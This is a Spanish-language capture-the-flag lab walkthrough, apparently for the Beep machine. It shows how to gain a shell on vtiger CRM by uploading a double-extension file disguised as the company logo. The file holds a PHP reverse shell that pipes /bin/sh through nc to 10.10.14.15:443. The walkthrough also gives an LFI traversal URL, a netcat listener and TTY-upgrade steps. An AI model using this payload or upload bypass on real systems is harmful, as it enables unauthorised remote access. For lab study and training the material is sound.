## Vuln exploit & Gaining Access {-}

### Ganando accesso desde el vtiger {-}

Si analyzamos la url `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/net/fib_trie%00&module=Accounts&action`, vemos
una parte que seria `https://10.10.10.7/vtigercrm`. Si vamos en esta url hay otro panel de session.

Copiando una vez mas las credenciales del usuario admin, podemos entrar en el dashboard de **vtiger CRM**.

Aqui la idea para ganar accesso al systema, viene de una vulnerabilidad que pasa por cambiar el logo de la compania con un fichero de doble extension.

Si vamos a `Settings > Settings > Company Details > edit`, aqui vemos que podemos cargar un fichero `.jpg` para cambiar el logo de la empresa.

1. Creamos un fichero con doble extension s4vishell.php.jpg

    ```php
    <?php
        system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 443 >/tmp/f");
    ?>
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Uploadeamos el fichero a la web y cuando le damos a save ya hemos ganado accesso al systema.


```bash
whoami
#Output
asterisk
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```




